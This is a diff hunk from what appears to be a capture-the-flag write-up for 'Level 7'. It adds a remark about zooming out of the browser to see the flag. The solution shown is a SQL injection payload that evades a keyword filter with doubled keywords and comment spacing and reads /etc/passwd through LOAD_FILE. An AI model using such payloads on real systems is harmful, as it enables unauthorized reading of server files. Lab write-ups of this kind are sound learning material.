@@ -225,6 +225,8 @@ Level 7
           INFO: BINGO! I can make the first call result no rows and just
                 union with the relevant file.
 
+  To see the flag, I had to zoom out of my browser.
+
 Solution:----------------------------------------------------------------------
   document.location = document.location.origin + "/level7.php?id=0/**/AND/**/id
     =1/**/UNunionION(SEselectLECT/**/LOAD_FIload_fileLE('/etc/passwd'))"
